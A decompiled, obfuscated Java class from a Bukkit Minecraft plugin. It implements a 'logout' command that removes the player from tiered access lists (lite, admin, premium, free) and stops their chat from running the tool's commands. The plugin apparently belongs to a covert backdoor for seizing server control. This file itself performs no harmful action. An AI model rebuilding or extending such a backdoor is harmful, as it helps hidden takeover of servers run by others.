/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 *  org.bukkit.plugin.Plugin
 */
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;

public class LogoutCommand
extends Command {
    @Override
    public boolean isBlatant() {
        return false;
    }

    public LogoutCommand() {
        LogoutCommand lllllllllllllIlIlllIlIIlIllIllll;
    }

    @Override
    public void execute(Core lllllllllllllIlIlllIlIIlIllIIIIl, String lllllllllllllIlIlllIlIIlIlIlllll, String[] lllllllllllllIlIlllIlIIlIlIlllIl, Player lllllllllllllIlIlllIlIIlIlIlIlll) {
        Bukkit.getScheduler().runTaskLater((Plugin)lllllllllllllIlIlllIlIIlIllIIIIl, () -> {
            lllllllllllllIlIlllIlIIlIlIIllIl.lite.remove(lllllllllllllIlIlllIlIIlIlIlIlll.getName());
            lllllllllllllIlIlllIlIIlIlIIllIl.admin.remove(lllllllllllllIlIlllIlIIlIlIlIlll.getName());
            lllllllllllllIlIlllIlIIlIlIIllIl.premium.remove(lllllllllllllIlIlllIlIIlIlIlIlll.getName());
            lllllllllllllIlIlllIlIIlIlIIllIl.free.remove(lllllllllllllIlIlllIlIIlIlIlIlll.getName());
        }, 1L);
        lllllllllllllIlIlllIlIIlIlIlIlll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You can now talk in chat and no longer execute ").append(Settings.NAME).append(" commands"))));
    }
}

